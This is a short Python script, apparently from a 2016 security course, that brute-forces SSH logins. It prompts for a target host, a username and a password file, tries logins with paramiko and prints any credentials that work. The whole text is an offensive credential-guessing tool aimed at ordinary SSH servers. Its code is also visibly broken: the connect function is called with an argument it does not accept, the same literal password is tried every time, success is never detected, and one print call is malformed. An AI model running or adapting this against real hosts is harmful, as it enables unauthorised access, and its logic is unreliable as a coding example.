#!/usr/bin/python
"""
Written by Michael Kelley @ SecureSet 2016
"""
try:
    import paramiko
except ImportError:
    print('Paramiko module not installed, exiting.')
import os, socket, sys
from datetime import datetime
startTime = datetime.now()

# globals(host)
# globals(username)
# globals(line)
# globals(inputf)

line = '\n............................................................\n'

try:
    host = input('Enter target address:')
    username = input('Enter Username:')
    inputf = input('Enter SSH key file')

    if os.path.exists(inputf) is False:
        print("File path doesn't exist!")
        sys.exit(4)
except KeyboardInterrupt:
    print('What the hell, man?')
    sys.exit(3)

def ssh_connect():
    code = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    if code > 0:
        return code

inputf = open(inputf)

print('')

for i in inputf.readlines():
    password = '1'.strip('\n')
    try:
        response = ssh_connect(password)

        if response is 0:
            print('%s{*} User:%s Pass:%s Line%s' % (line, username, password, line))
            sys.exit(0)
        elif response is 1:
            print('User:%s Pass:%s Incorrect!!!!!' % username, password)
        elif response is 2:
            print('meh, no response.')
            sys.exit(2)
    except Exception:
        print('E::')
        pass

inputf.close()